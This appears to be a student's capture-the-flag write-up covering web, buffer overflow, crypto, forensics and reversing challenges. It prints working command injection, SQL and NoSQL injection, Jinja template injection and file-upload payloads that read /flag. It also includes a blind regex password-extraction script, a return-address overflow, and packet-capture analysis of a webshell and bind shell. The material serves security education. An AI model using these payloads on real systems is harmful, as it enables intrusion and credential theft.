# Web

## I Want To Join (10 points)

> Can you join the Anti Pineapple on Pizza Society, even though their sign up form has been **disabled**?

The sign up is disabled, but only by client-side controls.

Observe the following HTML code on the challenge:
```html
<form method="post">
	<li>
		<h3>Sign Up Form</h3>
	</li>
	<li>
		<input type="email" placeholder="Email Address" name="email" value="">
	</li>
	<li>
		<input type="submit" value="Join the Anti Pineapple on Pizza Society" disabled="">
	</li>
</form>
```

Remove the `disabled` attribute on the `submit` button, and you can submit with any old email.

![Flag: `CTF{n3v3R_tRv5t_d3_cL1eNt5_111!11}`](images/i-want-to-join.png)
## Ping of Death (15 points)

> Some kid joined my Minecraft server and threatened that they were going to DDoS me using this dodgy website. In the end they just pinged my server, but I am 99% certain you can do a lot more with that website.
>
> **Can you hack the dodgy website and read the flag at `/flag` on the server?**

The "ping of death" likely refers to the skiddie technique of pinging a server to death, usually with the `ping` command.

Specify the input `-n 1 8.8.8.8; cat /flag`. This will result in `ping -n 1 8.8.8.8; cat /flag` being executed.

![Flag: `CTF{sCr1pTI3_k1Ddie5_c4nN0t_pR0gRaM_aNyThIng!!11one!}`](images/ping-of-death.png)
## cssubmit v2.0 (15 points)

> The UWA Computer Science Department recentally hired a team of CITS3200 students to build the new CSSubmit v2.0 website to replace the old CSSubmit website. However, the students were unable to complete the platform by the end of the unit, so it is still in **development** and still has **registrations disabled**.
>
> In their final sprint 3 documentation, they also noted that they were unable to implement the **file type check for submitting assignments**. However, they assumed that it was an unnecessary requirement for the project, hence why it was never completed.
>
> **Can you execute terminal commands on the server and read the flag at `/flag`?**

The description hints at unrestricted file upload. Registration, similar to `I Want To Join`, is only disabled on client-side.

Getting past registration, you are given the option to submit files. The url `home.php` also hints at what to upload.

Upload the following file, and view it:
```php
<?php
	echo file_get_contents("/flag")
?>
```

Flag: `CTF{cH3cK_Y0uR_f1L3_tYp3s_0r_g1t_w33b_sH3lL51!!!!1!}`

## My First PHP Site (15 points)

> My first PHP website looks extremely cool! However, some random Security researchers keep on contacting me about *"several injection vulnerabilities"*. In all honesty I have no idea what they are talking about, so can you test my website and find the vulnerabilities for me?

> The flag is in the table called **flag** on the database.

The description hints at SQL injection.

Log in as an admin using these inputs

Username and password: `' OR 1 = 1; --`

After logging in, retrieve the schema for the `flag` table, by specifying this input to search:

```
' UNION SELECT (SELECT sql FROM sqlite_master WHERE name = 'flag'), 2, 3; --
```

![SQL: `CREATE TABLE "flag" ( "id" INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, "flag" VARCHAR)`](images/my-first-php-1.png)

After observing the `flag` column in the `flag` table, inject a subquery to retrieve it:

```
' UNION SELECT (SELECT flag FROM flag), 2, 3; --
```

![SQL: `CTF{i_5h0uLd_pRoBs_l3aRn_aBoUt_pRePaRed_qU3ri3s...}`](images/my-first-php-2.png)

## Web Ninja (15 points)

> Do you want to become the ultimate master at building websites?
> 
> Join the **Web Ninja Course** today and learn how to design websites using modern frameworks such as **Flask**.
> 
> **Find a remote code execution vulnerability on the website and exploit it to get the flag at `/flag` on the server!**

The description calls for remote code execution on Flask. The references to ninja likely means that the RCE is through a Server-Side Template Injection on *Jinja*.

Email verification is done only on client-side.
```html
<form action="/signup" method="post" id="signup-form">
	<input type="email" placeholder="Email" name="email" value=""><br>
	<input id="form-submit" type="submit" value="Submit"><br>
</form>
```

Remove the attribute `type="email"`, and input `{{ request['application']['__globals__']['__builtins__']['open']('/flag').read() }}`.

![SQL: `CTF{tH3s3_n1Nj4s_aR3_h3cK1nG_mY_jInjA_t3MpLatEs!!one!}`](images/web-ninja.png)

## No SQL Injection 1 (15 points)
> I have heard all about the issues that SQL injection attacks can cause.
> 
> So I decided to not use a relational database system and use a **NoSQL** backend database instead. This way my secure website cannot be vulnerable to any SQL injection attacks!
>
> **Can you test my login page to prove that I am correct and my website is secure?**
> 
> The goal is to successfully login and view the admin page.

The description hints to a injection on NoSQL queries, most likely MongoDB. The backend has no type validation on user input, so we can inject conditions in the MongoDB queries.

Open the debugger in your browser and set a breakpoint on the `$.ajax` call within `main.js`.

Submit a login request.

Execute this in the console.
```js
loginForm.username = loginForm.password = {"$ne": null};
```

![SQL: `CTF{w41t_y0u_c4n_iNj3cT_nO_sQlI_dB5_2???!??}`](images/no-sql-injection-1.png)

## No SQL Injection 2 (20 points)

> Oh dear you weren't supposed to pass the authentication page. At least *my password* is secure on the *NoSQL database* and you cannot get that! Even though I forgot to hash it...
> 
> *Can you exfiltrate the password for the admin account?*
> 
> The flag is the password, only has *lower and upper case letters* and will start with `CTF`.

This also requires MongoDB injection; Mongo allows for a `$regex` operator in matching, and we can perform a blind injection (observing whether inputs are true or false) in order to retrieve the password character by character.

We first need to retrieve the length of the password. This can be done by matching for `.{n}`, where n is an incrementing number. If n+1 fails to authenticate, then n is the length of the password.

This does require a bit of scripting (asyncio for speed):
```py
import string
import asyncio
import aiohttp


async def main():
    known = "CTF"
    async with aiohttp.ClientSession() as session:

        async def fetch(password, event):
            async with session.post(
                "http://cits4projtg2.cybernemosyne.xyz:1007/api/login",
                json={
                    "username": {"$ne": None},
                    "password": {"$regex": password}
                }
            ) as resp:
                if (await resp.json()).get("url") == "/admin":
                    event.password = password
                    event.set()

        while len(known) < 17:
            tasks = []
            event = asyncio.Event()
            for c in string.ascii_letters:
                tasks.append(
                    asyncio.create_task(
                        fetch(known + c, event)
                    )
                )

            await event.wait()
            known = event.password
            for task in tasks:
                task.cancel()
            print(known)
        print()


if __name__ == "__main__":
    asyncio.run(main())
```

Flag: `CTFnosqlregexking`

# Buffer Overflow

## SecureApp PWN (20 points)

> The developers of SecureApp aren't too secure with their C programs. I was able to cause a **segmentation fault** error somehow and analysing the functions shows there is a very interesting one called `exploitme`.
> 
> **Can you exploit the buffer overflow vulnerability and execute the `exploitme` function?**

Recall that function call stack frames are laid out in the following order: local variables, *the address to return to when the function finishes execution*, then the function's parameters.

We are supposed to buffer overflow the return address in order to jump to the exploitme function:

```py
from pwn import remote, ELF, p64


(io := remote("cits4projtg.cybernemosyne.xyz", 1002)).recvuntil(b"Password: ")
io.send(b"\n")
io.recvuntil(b"Name: ")
io.sendline(b"A" * 120 + p64(ELF("./secureapp").symbols['exploitme'])) # Offset known from disassembly
print(io.recvall().decode())
io.close()
```

Flag: `CTF{pwN3D_uR_w3aK_C_aPpLiC4sHon!11!}`

# Cryptography

## Diffiecult Communication (10 points)

> Bob has sent you a message using a combination of modern **cryptographic algorithms** that is encrypted inside the file encrypted_msg.bin.
> 
> Firstly, the Diffie-Hellman (DH) key exchange algorithm was used to derive a shared key between Bob and yourself. In the file `dh_key_exchange.py` you are provided the public base and modulus, Bob's public key and *your private key* for the DH key exchange.
> 
> The shared key is then hashed using *SHA256* that is then used to encrypt Bob's original message using AES-256-CBC with an initial vector of 16 null bytes (`b"\x00"*16`).

```py
shared = pow(g_b, a, p)

key = SHA256.new(long_to_bytes(shared)).digest()

print(unpad(AES.new(key, AES.MODE_CBC, b"\0" * 16).decrypt(open("encrypted_msg.bin", "rb").read()), 256))
```

Flag: `CTF{g1mMe_4_j1fFie_t0_d3cRyPt_tH15_d1fFi3!}`

## Brain XOR Brawn (15 points)

> Can you recover the original plaintext that was encrypted using the XOR stream cipher with a key that is **8 bytes long**? The ciphertext is encoded as hex values and the plaintext starts as **CITS3004{ ... }**.

XOR is commutative; p ^ k = c; then c ^ p = k, where p can be a partial known plaintext:

```py
>>> from Crypto.Util.strxor import strxor
>>> ciphertext = bytes.fromhex("303c2436415b554d081641153a58172d400d243a022751481d21431d2634510d0741332e2d5a0b3a4318390b354a444852540d")
>>> known = b"CITS3004{"
>>> key = strxor(ciphertest[:8], known[:8])
>>> strxor(ciphertext, (key * 7)[:51])
b'CITS3004{c1pH3rT3xT_pL41nT3xT_4tt4CK_1nC0mInG!!1!!}'
```

## ECBrypted Image (15 points)

> On a late afternoon working hard as a NSA agent, you see an encrypted image sent between two suspected Kinder Surprise smugglers into the US. After you inspect the communications further, you discover that the sender used **AES encryption** using the **ECB mode** to encrypt the image, the original image was a **PPM file** and had a width and height of **1920 by 1080 pixels** respectively.
> 
> However, you were unable to figure out what was the key used to encrypt the image.
> 
> **Can you still see the hidden message within the image?**

ECB can reveal repeating patterns in raw data. As PCM is just raw RGB values, we can just view it as raw image data in GIMP with the speficified dimensions.
![Flag: `CTF{ECB IS REALLY BAD TO ENCRYPT IMAGES}`](images/ecbrypted.png)
## Rocking With The Cats (15 points)

> Man some of these cats go absolutely wild! Last Saturday, I went to a house party where I saw some feral feline screaming out their password hash to the tune of **We Will Rock You** by Queen. I tried telling them that it is a pretty dumb idea to leak their hashed password to everyone, but they insisted it was fine since their password was **32 characters long** and it cannot be brute forced.
>
> **Can you teach this feline fleabag a lesson and crack their password?**

The description clearly calls for the infamous rockyou wordlist.
The password is known to be only 32 characters long, so we filter for those from `rockyou.txt`:
```sh
$ grep "^.\{32\}$" rockyou.txt > wordlist
```
Then, we can crack the password.

Flag: `qwertyuiopasdfghjklqwertyuiopasd`

# Unfair Game (20 points)

> BEHOLD THE GAME THAT WILL BE KING OF THE ESPORT INDUSTRY!
> 
> It has everything that all other games lack to some degree; action, suspense, betrayal, battle royal, someone screaming into their microphone and overpriced loot boxes!
> 
> Some critics question if our game can be beaten, but we know it is impossible since we use a **pseudo random number generator** that has been used for decades! You can try beating this game, but we bet you won't be able to!
> 
> **Win 99% of the rounds to get the flag.**

The provided source code has the following line:

`srand(time(NULL))`

Hence, we are to fetch the time of the target machine, then retrieve the generated random numbers.
Due to the potential of slight offsync, we have to search for the range around our machine to see if the seed would be correct.
We can do this by incorrectly guessing the first input and retrieving the output to compare to.
The following Python script uses the local libc library as Python's random module would not produce the same output.
```py
from pwn import remote
from time import time
from ctypes import CDLL

libc = CDLL("libc.so.6")

io = remote("cits4projtg.cybernemosyne.xyz", 1001)
t = int(time())

io.recvuntil(b"Number: ")
io.sendline(b"0")
io.recvuntil(b"Wrong! It was ")
known = int(io.recvuntil("!")[:-1])
print("First =", known)

for d in range(-10, 10):
    libc.srand(t + d)
    if known == libc.rand():
        break

print("s =", t+d)

for i in range(99):
    print(io.recvuntil("Number: "))
    io.sendline(str(libc.rand()))

io.interactive()
```

Flag: `CTF{0i_y0v_w3rE_cHe4t!nG!_y0u_w3rEnT_sUpPo5eD_2_gVeS5_mY_nUmBeRs!1!!}`

# Forensics

## Task 1: Who is that? (10 points)

> Help! Our Windows server is under attack! Well we think we are but not 100% sure...
> 
> The reason why we think that we are being attacked is because we noticed thousands of network packets being sent to and from our server. Can you analyse our network packet dump and find if we have been compromised?
> 
> The first task that you will need to do is identify the **IP address of the suspicious user.** To support the claim that the IP address is being used for a malicious purpose, use [AbuseIPDB](https://www.abuseipdb.com/) to retrieve the **country** and the **VPN company** that was used. The flag will be in the format below in all lower case and no spaces:
> 
> `<COUNTRY>:<VPN COMPANY>:<IP ADDRESS>`

Looking through the packet capture and sorting by source IP address, we can see that address `5.8.16.237` stands out for making up a majority of HTTP requests.
Going to [AbuseIPDB](https://www.abuseipdb.com/check/5.8.16.237) reveals that this is a known address used for malicious purposes.
Going further and looking at its [WHOIS information](https://www.abuseipdb.com/whois/5.8.16.237) reveals that this is a Russian IP belonging to ProtonVPN.

Flag: `russia:protonvpn:5.8.16.238`

## Task 2: Found Your Vulnerable Website (10 points)

> Once you have identified the malicious actor, you can filter the traffic by using the display filter `ip.addr == <IP address>` (eg. `ip.addr == 120.123.69.5`).
> 
> You can see in the filtered packet capture that they first used a **port scanner** then a **web fuzzer** to scan the server. A **web fuzzer** is a tool that brute forces a tonne of requests to a website to establish a map of valid URL paths on the website and *potentially find vulnerable sections*.
> 
> For this task, it looks like the adversary found a URL path to a *damn vulnerable web application* (DVWA).
> 
> **What was the URL path that the hacker discovered that hosted the DVWA web application?**

Scrolling through captures with the filter `ip.addr == 5.8.16.237 and http.response.code != 404` reveals a successful 301 repsonse to `/secure`. Following this request indicates that it is the DVWA.

![Flag: `/secure`](images/task-2.png)

## Task 3: Such Bad Creds (10 points)

> Further analysing the network packets, it appears that the adversary sent a few POST requests to a page called `login.php`. This means that the the hacker tried a few login attempts before successfully logging in.
> 
> What were the username and password that the adversary used to login?
> 
> You answer needs to be in the format of `<username>:<password>`. For an example for the username `alvaro` and the password `12345` your answer would be `alvaro:12345`.

Using the previous filter, we can observe the attacker make a couple of attempts against the `admin` user, before being successful with the password `password`, resulting in a 302 Found redirecting to the authenticated page.

Flag: `admin:password`

## Task 4: That File Does Not Look Safe (10 points)

> The malicious actor was able to upload a malicious **PHP** file to the website and use a Local File Inclusion vulnerability to execute that file.
> 
> **What was the name of the PHP file that the hacker uploaded?**

Using the previous filter, we can observe the attacker sending a POST to `/secure/vulnerabilities/upload`.
Within the POST body, we can see form-data containing a file with MIME type `application/x-php` with the filename `webshell.php`.

![Flag: `webshell.php`](images/task-3.png)

## Task 5: That File Looks Even Worse (10 points)

> It is speculated that the webshell was used to upload and execute some malware onto the Windows server, that can be revealed by analysing the POST requests that were sent.
> 
> **What was the name of the executable that was uploaded onto the server?**

Using the filter `http.request.uri contains "webshell.php"`, we can see the attacker make a POST request to `webshell.php` uploading `hickityhackityOWO.exe`.

Flag: `hickityhackityOWO.exe`

## Task 6: This Server Is In A Bind (15 points)

> It turns out that that malware that the hacker uploaded was a **bind shell**. Bind shells (AKA forward shells) open a port on a victims computer that enables an attacker to directly connect to as a client to start executing terminal commands on the victim.

> Your next task is to figure out the the **port** that was opened by the malware that the hacker connected to start executing commands. You'll want to look for a TCP connection made by the hacker to a new port after they uploaded and executed the malware.

We can use a filter looking for the attacker IP and excluding known HTTP port and only after the time of upload (using the `No` column from Task 5): `ip.src == 5.8.16.237 and tcp.dstport != 80 and frame.number >= 76608`.
Using the filter, we see the attacker make a connection to port `42069` (nice).

Flag: `42069`

## Task 7: Whoami (15 points)

> Using the port number that you found in Task 6, it will help to filter for just communications on that specific port using the display filter `tcp.port == <port number>` (eg. `tcp.port == 80`). It is common to see hackers running the `whoami` command on machines once they can start executing commands on the Windows machine to figure out which account they have compromised.
> 
> Analysing the TCP packets of the bind shell, **what is the name of the user on the Windows server that the adversary compromised?**

We can follow the TCP stream from the packet found at Task 6, using the shortcut `Ctrl+Alt+Shift+T` with the packet selected.

![Flag: `nt authority/system`](images/task-7.png)

## Task 8: A Present From The Hacker (15 points)

> Finally it looked like the hacker left a message on the Windows Server.
> 
> What was the message that the hacker left on the server and file that they saved that message to?
> 
> Your answer needs to be in the format of <MESSAGE>:<FILE> for an example HACK THE PLANET:C:\message.txt.

We can use the previous TCP stream from Task 7 to retrieve the file.

Flag: `YA JUST GOT PWNED LOOOOL!:C:\getrektd.txt`

# Reverse Engineering

## SecureApp (10 points)

> The developers of SecureApp believe that their new C application that is really secure.
> 
> Can you reverse engineer the application and login into SecureApp successfully?

lmao just use `strings`; the password is `supersecurepassword1234`.

Flag: `CTF{sTr1nGs_4_tH3_w1n!1!1}`
